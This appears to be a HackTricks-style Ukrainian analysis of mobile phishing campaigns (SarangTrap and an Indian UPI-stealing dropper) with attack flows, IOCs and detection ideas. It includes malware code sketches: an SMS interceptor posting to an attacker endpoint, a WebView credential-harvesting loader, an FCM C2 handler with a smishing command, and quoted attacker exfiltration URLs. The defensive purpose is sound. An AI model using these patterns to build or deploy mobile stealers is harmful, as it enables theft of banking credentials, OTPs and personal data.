# Мобільний Фішинг та Розповсюдження Шкідливих Додатків (Android та iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ця сторінка охоплює техніки, які використовують зловмисники для розповсюдження **шкідливих Android APK** та **профілів мобільної конфігурації iOS** через фішинг (SEO, соціальна інженерія, фейкові магазини, додатки для знайомств тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025) та інших публічних досліджень.

## Потік Атаки

1. **Інфраструктура SEO/Фішингу**
* Зареєструвати десятки доменів, що схожі (знайомства, хмарне зберігання, автомобільні послуги…).
– Використовувати ключові слова та емодзі місцевою мовою в елементі `<title>`, щоб піднятися в Google.
– Розмістити *обидва* інструкції з установки Android (`.apk`) та iOS на одній цільовій сторінці.
2. **Перший Етап Завантаження**
* Android: пряме посилання на *недодаткований* або “додаток з третьої сторони” APK.
* iOS: `itms-services://` або просте HTTPS посилання на шкідливий **mobileconfig** профіль (див. нижче).
3. **Соціальна Інженерія Після Встановлення**
* При першому запуску додаток запитує **код запрошення / перевірки** (ілюзія ексклюзивного доступу).
* Код **POSTиться через HTTP** на Командний та Контрольний (C2) сервер.
* C2 відповідає `{"success":true}` ➜ шкідливе ПЗ продовжує працювати.
* Динамічний аналіз пісочниці / AV, який ніколи не подає дійсний код, не бачить **шкідливої поведінки** (евазія).
4. **Зловживання Дозволами Часу Виконання** (Android)
* Небезпечні дозволи запитуються **тільки після позитивної відповіді C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Старі версії також запитували дозволи на SMS -->
```
* Останні варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але залишають шлях коду Java/Kotlin, який читає SMS через рефлексію ⇒ знижує статичний бал, але все ще функціонує на пристроях, які надають дозвіл через зловживання `AppOps` або старі цілі.
5. **Фасадний Інтерфейс та Збір Даних у Фоновому Режимі**
* Додаток показує безпечні екрани (переглядач SMS, вибір галереї), реалізовані локально.
* Тим часом він ексфільтрує:
- IMEI / IMSI, номер телефону
- Повний дамп `ContactsContract` (JSON масив)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті за допомогою [Luban](https://github.com/Curzibn/Luban) для зменшення розміру
- Додатковий вміст SMS (`content://sms`)
Payloads **пакуються в архів** і надсилаються через `HTTP POST /upload.php`.
6. **Техніка Доставки iOS**
* Один **профіль мобільної конфігурації** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зареєструвати пристрій у “MDM”-подібному нагляді.
* Інструкції соціальної інженерії:
1. Відкрити Налаштування ➜ *Профіль завантажено*.
2. Натиснути *Встановити* три рази (скріншоти на фішинговій сторінці).
3. Довірити недодаткований профіль ➜ зловмисник отримує *Контакти* та *Фото* права без перевірки App Store.
7. **Мережева Система**
* Простий HTTP, часто на порту 80 з заголовком HOST, як `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко помітити).

## Тестування Захисту / Поради Червоній Команді

* **Обхід Динамічного Аналізу** – Під час оцінки шкідливого ПЗ автоматизуйте фазу коду запрошення за допомогою Frida/Objection, щоб досягти шкідливої гілки.
* **Порівняння Маніфесту та Часу Виконання** – Порівняйте `aapt dump permissions` з часом виконання `PackageManager#getRequestedPermissions()`; відсутність небезпечних дозволів є червоним прапором.
* **Мережева Канарка** – Налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE`, щоб виявити непостійні POST-сплески після введення коду.
* **Перевірка mobileconfig** – Використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перерахувати `PayloadContent` і виявити надмірні права.

## Ідеї для Виявлення Блакитної Команди

* **Прозорість Сертифікатів / DNS Аналітика** для виявлення раптових сплесків доменів з багатими ключовими словами.
* **User-Agent та Path Regex**: `(?i)POST\s+/(check|upload)\.php` з клієнтів Dalvik поза Google Play.
* **Телеметрія Кодів Запрошення** – POST 6–8-значних числових кодів незабаром після установки APK може вказувати на стадіювання.
* **Підписування MobileConfig** – Блокувати недодатковані профілі конфігурації через політику MDM.

## Корисний Фрагмент Frida: Авто-Обхід Коду Запрошення
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Індикатори (Загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Цей шаблон спостерігався в кампаніях, які зловживають темами державних пільг для крадіжки індійських UPI облікових даних та OTP. Оператори поєднують авторитетні платформи для доставки та стійкості.

### Ланцюг доставки через надійні платформи
- Відео на YouTube → опис містить коротке посилання
- Коротке посилання → сайт фішингу на GitHub Pages, що імітує легітимний портал
- Той же репозиторій GitHub містить APK з підробленою позначкою “Google Play”, що безпосередньо посилається на файл
- Динамічні фішингові сторінки працюють на Replit; віддалений командний канал використовує Firebase Cloud Messaging (FCM)

### Dropper з вбудованим payload та офлайн установкою
- Перший APK є інсталятором (dropper), який постачає справжнє шкідливе ПЗ за адресою `assets/app.apk` і запитує користувача вимкнути Wi‑Fi/мобільні дані, щоб зменшити виявлення в хмарі.
- Вбудований payload встановлюється під невинною назвою (наприклад, “Secure Update”). Після установки як інсталятор, так і payload присутні як окремі додатки.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення кінцевих точок через коротке посилання
- Шкідливе ПЗ отримує список активних кінцевих точок у простому текстовому форматі, розділеному комами, з короткого посилання; прості перетворення рядків створюють фінальний шлях фішингової сторінки.

Приклад (санітизований):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Крок “Зробити платіж ₹1 / UPI‑Lite” завантажує HTML-форму зловмисника з динамічного кінцевого пункту всередині WebView і захоплює чутливі поля (телефон, банк, UPI PIN), які `POST`яться на `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Саморозповсюдження та перехоплення SMS/OTP
- Запитуються агресивні дозволи при першому запуску:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти використовуються для масової відправки смс-фішингу з пристрою жертви.
- Вхідні смс перехоплюються приймачем трансляції та завантажуються з метаданими (відправник, текст, SIM-слот, випадковий ID для кожного пристрою) на `/addsm.php`.

Схема приймача:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- Payload реєструється в FCM; push-повідомлення містять поле `_type`, яке використовується як перемикач для активації дій (наприклад, оновлення шаблонів тексту фішингу, перемикання поведінки).

Приклад payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз обробника:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK містить вторинний вантаж у `assets/app.apk`
- WebView завантажує платіж з `gate.htm` і ексфільтрує до `/addup.php`
- Ексфільтрація SMS до `/addsm.php`
- Конфігурація, що отримується через короткі посилання (наприклад, `rebrand.ly/*`), що повертає CSV кінцеві точки
- Додатки, позначені як загальні “Оновлення/Безпечне оновлення”
- FCM `data` повідомлення з `_type` дискримінатором в ненадійних додатках

### Detection & defence ideas
- Позначати додатки, які інструктують користувачів вимкнути мережу під час установки, а потім завантажити другий APK з `assets/`.
- Сповіщати про кортеж дозволів: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + платіжні потоки на основі WebView.
- Моніторинг виходу для `POST /addup.php|/addsm.php` на не корпоративних хостах; блокувати відомі інфраструктури.
- Правила мобільного EDR: ненадійний додаток, що реєструється для FCM і розгалужується на основі поля `_type`.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
